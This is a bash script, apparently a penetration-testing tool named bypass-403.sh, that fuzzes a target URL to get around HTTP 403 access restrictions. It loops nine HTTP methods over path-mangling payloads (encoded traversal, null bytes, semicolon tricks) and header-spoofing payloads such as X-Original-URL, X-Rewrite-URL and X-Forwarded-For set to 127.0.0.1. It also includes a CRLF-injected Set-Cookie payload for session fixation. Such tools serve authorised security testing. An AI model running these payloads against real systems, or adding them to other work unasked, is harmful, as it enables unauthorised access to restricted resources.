#! /bin/bash

# call with paths without first slash `/`

# definitions
checkhelp(){
    echo "Usage: ./bypass-403.sh <target_url> <path> [parallel_processes]"
    echo ""
    echo "Arguments:"
    echo "  <target_url>      : The base URL of the target (e.g., https://target.com)"
    echo "  <path>            : The path to fuzz (e.g., /admin, without the leading slash if it's relative to the target_url)"
    echo "  [parallel_processes]: Optional. The number of parallel CPU processes to use with xargs. Defaults to 4."
    exit 0
}

if [ $# -lt 2 ]; then
    checkhelp "$@" 
fi

PARALLEL_PROCESSES=${3:-4} # Default to 4 if not provided
# echo {GET,POST,PUT,TRACE} | xargs -n1 -I {} $CURLREQUEST -X {} $1/$2
requestfuzzer(){
    for REQ in GET POST PUT CONNECT PATCH OPTIONS HEAD TRACE TRACK
    do
        curl -k -s --max-time 10 -o /dev/null -iL -w [%{http_code}],%{size_download} -X $REQ "$@"
        echo -n " $REQ --> $@"
        echo
    done
}
export -f requestfuzzer

# path fuzzing
xargs -P $PARALLEL_PROCESSES -n 1 -I {} bash -c 'requestfuzzer "$@"' _ {} <<EOF
"$1/$2"
"$1/$2%0d%0aSet-Cookie:%20ASPSESSIONIDACCBBTCD=SessionFixed%0d%0a"
"$1/%2e/$2"
"$1/$2%2e%2e%2f"
"$1/$2/."
"$1/$2/*"
"$1/$2;/"
"$1/$2..%00/"
"$1/$2..%00x"
"$1/$2..%5c"
"$1/$2..;/"
"$1/$2..%2f/"
"$1//$2//"
"$1/./$2/./"
"$1/$2%20"
"$1/$2%23"
"$1/$2%09"
"$1/$2?"
"$1/$2.html"
"$1/$2.json"
"$1/$2%2500.md"
"$1/$2/?anything"
"$1/$2#"

# headers fuzzing
-H "Content-Length:0" "$1/$2"
-H "X-Original-URL: $2" "$1/admin"
-H "X-Original-URL: $2" "$1"
-H "X-Original-URL: $2" "$1/$2"
-H "X-Override-URL: $2" "$1"
-H "X-Rewrite-URL: $2" "$1"
-H "X-Remote-IP: 127.0.0.1" "$1/$2"
-H "Referer: $2" "$1"
-H "Referer: $2" "$1/$2"
-H "Referer: $1/$2" "$1/$2"
-H "X-Custom-IP-Authorization: 127.0.0.1" "$1/$2"
-H "X-Forwarded-For: http://127.0.0.1" "$1/$2"
-H "X-Forwarded-For: 127.0.0.1:80" "$1/$2"
EOF
